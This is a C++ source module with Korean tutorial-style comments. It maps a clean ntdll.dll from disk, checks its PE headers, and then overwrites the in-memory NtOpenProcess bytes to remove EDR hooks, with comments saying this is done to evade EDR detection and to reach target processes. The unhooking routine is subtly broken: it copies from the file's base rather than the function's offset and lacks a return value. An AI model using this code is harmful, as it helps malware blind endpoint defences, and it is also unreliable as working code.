//왜 PE File을 열어야 하는가?
/*
원래는 CPU가 NtOpenProcess 함수 같은 것이 메모리에 올라와 있을 때는 아래와 같은 모습입니다.
0x1000 코드 A
0x1004 코드 B
0x1008 코드 C
와 같이 동작합니다.

EDR이 훅을 걸어서 첫 줄을 지우고 자신에게 이동하게 만드는 명령어들 덮어쓰면 아래와 같은 모습이 됩니다.
0x1000 EDR JMP 0x9000 (검문소 주소로 점프)
0x1004 코드 B
0x1008 코드 C

단순히 메모리에 올라온 5byte를 읽기만 하면 이것이 EDR 솔루션에 의해 변조되었는지 알 수 없기 때문입니다.
*/



export module Auditor.PE;

import Auditor.Types;
#include <windows.h>


export namespace Auditor{   

    inline void* ntdllBaseAddress = nullptr; 
    //왜 void*냐? 8byte 공간을 만드는 것은 동일. 일단 형태 없이 메모리 주소를 받아두었다나 필요할 때 원하는 구조체로 자유롭게 변환하기 위함.
    //PIMAGE_DOS_HEADER dosHeader(PIMAGE_DOS_HEADER)ntdllBaseAddress; 같이 형 변환이 쉬워집니다.
    
    namespace PE{ //namespace Auditor::PE처럼 만들면 Auditor::PE라는 독립된 폴더로 인식해버립니다.
        Auditor::Types::PEError OpenPE(const char* FileName){ //함수를 만드는데, "Auditor::Types::PEError를 반환할거다"라는 뜻입니다.

            //ntdll.dll 파일을 이 프로세스의 가상 메모리에 매핑합니다.
            //파일이 하드 디스크에 있나 검사 -> 파일 객체(File Object) 생성. 
            //어떤 프로세스가 이 파일을 어떻게 열어서 쓰고 있는가에 대한 실시간 장부.
            HANDLE hFile = CreateFileA( 
                "C:\\Windows\\System32\\ntdll.dll",
                GENERIC_READ,      //읽기 권한만 요구하기.
                FILE_SHARE_READ,
                NULL,               
                OPEN_EXISTING,      //이미 존재하는 파일만 열기.
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
            if (hFile == INVALID_HANDLE_VALUE){
                return Auditor::Types::PEError::FileNotFound;
            }

            //CreateFileA로 해당 파일의 존재를 확인 후 접근 권한을 받았습니다.
            //파일 객체 -> 섹션 객체. File Object를 메모리의 가상 주소 공간과 어떻게 연결할 것인가.
            //CreateFileA로 구한 핸들을 사용해 CreateFileMappingA로 커널 내부에 메모리 관리자와 파일 매핑 객체를 생성합니다.
            HANDLE hMapping = CreateFileMappingA(
                hFile,              //위에서 CreateFileA로 구한 파일 열쇠
                NULL,               //보안속성 패스
                PAGE_READONLY,      //읽기 전용으로 장부를 개설합니다.
                0,                  //파일 최대 크기(고상위). 0은 원본 크기 자동 인식입니다.
                0,                  //파일 최대 크기(저상위). 0이 의미하는 것은 동일합니다.
                NULL                //매핑 객체 이름. NULL: 다른 프로세스와 공유 안합니다.
            );
            if (hMapping == NULL){
                CloseHandle(hFile);
                return Auditor::Types::PEError::FileMappingFailed;
            }

            //생성된 매핑 객체를 MapViewOfFile을 통해 프로세스 가상 주소 공간에 매핑 뷰로 올립니다.
            //장부를 진짜 메모리 주소로 시각화하는 단계.
            LPVOID pBaseAddress = MapViewOfFile(
                hMapping,           //위에서 CreateFileMappingA로 만든 장부 열쇠
                FILE_MAP_READ,      //메모리를 읽기 전용 뷰로 보겠다는 의미입니다.
                0,                  //파일의 어디부터 매핑할지(고상위). 처음부터 보기 때문에 0.
                0,                  //파일의 어디부터 매핑할지(저상위). 처음부터 보기 때문에 0.
                0                   //매핑할 크기. 0은 파일 전체를 통째로 매핑.
            );

            if (pBaseAddress == NULL){
                CloseHandle(hMapping);
                CloseHandle(hFile);
                return Auditor::Types::PEError::FileMappingFailed;
            }

            ntdllBaseAddress = pBaseAddress; 
            //주소를 읽을 필요 없이 저장만 하면 되어서 자료형이 필요 없습니다.
            //Auditor::PE::OpenFE 내에서 ntdllBaseAddress에 자료형을 붙혔다면, 우리가 원하는 Auditor::PE의 값이 아닌 함수 내의 ntdllBaseAddress의 값을 가져옵니다.
            //우리가 다른 함수에서 OpenPE 내의 값을 사용하고 싶어도 Auditor::PE의 변수에 대입한 것이 아니라 지역 변수에 대입한 것이므로 함수 종료시 그 값이 사라집니다.

            PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pBaseAddress; 
            //PIMAGE_DOS_HEADER는 무조건 포인터 자료형.
            //PIMAGE_DOS_HEADER: 일반적인 포인터와 다르게 우리가 받은 파일 데이터가 있지만, 
            //그 안의 데이터는 IMAGE_DOS_HEADER 구조체가 있습니다.

            if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE){ //화살표(->)는 구조체의 주소를 타고 들어가서 안의 멤버 변수를 가리킵니다.
                //e_masic: IMAGE_DOS_HEADER 구조체의 가장 첫 줄에 위치한 2byte짜리 필드.
                //이름 뿐만이 아니라 실행 파일이 맞다고 판단 가능힙니다.
                UnmapViewOfFile(pBaseAddress);
                CloseHandle(hMapping);
                CloseHandle(hFile);
                return Auditor::Types::PEError::InvalidDOSHeader;
            }

            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pBaseAddress + dosHeader->e_lfanew);
            //e_lfanew이름의 뜻: Long File Address to New EXE Header
            //IMAGE_DOS_HEADER 구조체의 마지막 줄에 위치한 4byte(LONG)짜리 필드. 
            //DOS헤더 뒤에 붙는 찌꺼기 코드의 길이가 각각 다름. offset to NT Header
            //e_lfanew를 더해서  NT 헤더가 있는지 찾습니다.

            if (ntHeaders->Signature != IMAGE_NT_SIGNATURE){
                //IMAGE_NT_HEADERS 구조체의 첫 번째 줄에 위치한 4byte(DWORD)짜리 필드
                //NT 헤더에 도착 후 바로 박혀있는 도장이 Signature. 여기에 PE라는 4byte라는 문자가 박히면 NT 헤더.
                UnmapViewOfFile(pBaseAddress);
                CloseHandle(hMapping);
                CloseHandle(hFile);

                return Auditor::Types::PEError::InvalidNTHeader;
            }
            //역순으로 반납하기(자원 해제)
            // UnmapViewOfFile(pBaseAddress);
            // CloseHandle(hMapping);
            // CloseHandle(hFile);

            return Auditor::Types::PEError::Success;
        }
    }

    

    namespace hook{
        Auditor::Types::PEError UnhookFuntion(const char* funcName){

            BYTE* hookedNtOpenProcess = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
            // 이미 메모리에 로드되어 EDR에게 오염된 ntdll.dll의 NtOpenProcess 주소를 가져옵니다.
            // GetModuleHandleA: 이미 내 프로그램 메모리에 로드된 특정 DLL의 시작주소(Base Address)를 조용히 알아내라. 조용히: 디스크를 건드리지 않고 로그를 남기지 않는다.
            // GetProcAddress: 특정 DLL의 시작 주소를 주면 그 안에 있는 특정 함수의 진짜 실행주소를 찾아라.
            // NtOpenProcess: 다른 프로세스(해킹 타깃이나 시스템 핵심 프로세스)을 잡을 수 있는 Handle을 윈도우 유저모드 밑바닥에서 발급해주는 함수.
            // ↳ 모든 핸들 함수의 종착지.

            

            BYTE* cleanNtOpenProcess = (BYTE*)ntdllBaseAddress;
            //C:\\Windows\\System32\\ntdll.dll에 있는 것과 비교를 해야 하는데 디스크에 있는 것이므로 GetProcAddress로는 할 수 없습니다.
            //OpenPE에 존재하던 pBaseAddress의 값을 ntdllBaseAddress에 담아와서 대입합니다.

            DWORD old_permision = 0; //unsigned int. 

            if (cleanNtOpenProcess[0] != hookedNtOpenProcess[0]){ //
                VirtualProtect(
                    hookedNtOpenProcess, //권한을 변경할 메모리 영역의 시작할 주소입니다.
                    32,                  //권한을 변경할 바이트 단위의 메모리 크기. 간혹 14byte로 jmp를 시도하는 EDR이 있기 때문에 여유롭게 설정합니다.
                    PAGE_EXECUTE_READWRITE, //실행 및 읽기 쓰기 권한.
                    &old_permision
                );
            }
            for (int i=0; i<32; i++){
                hookedNtOpenProcess[i] = cleanNtOpenProcess[i];
            }

            DWORD dummy = 0;
            VirtualProtect( //EDR의 의심을 피하기 위해 원래 권한으로 복구합니다.
                hookedNtOpenProcess,
                32,
                old_permision,
                &dummy
            );
        }
    }
}

